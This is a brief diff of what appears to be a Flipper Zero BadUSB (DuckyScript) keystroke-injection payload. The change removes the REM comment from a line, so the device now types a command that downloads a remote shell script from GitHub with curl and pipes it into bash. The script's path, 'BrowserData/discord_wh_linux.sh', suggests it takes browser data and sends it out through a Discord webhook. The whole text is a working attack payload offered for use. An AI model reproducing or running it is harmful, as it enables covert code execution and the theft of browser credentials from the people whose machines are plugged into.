@@ -13,5 +13,5 @@ DELAY 500
 DOWN
 ENTER
 DELAY 500
-REM STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
+STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
 ENTER
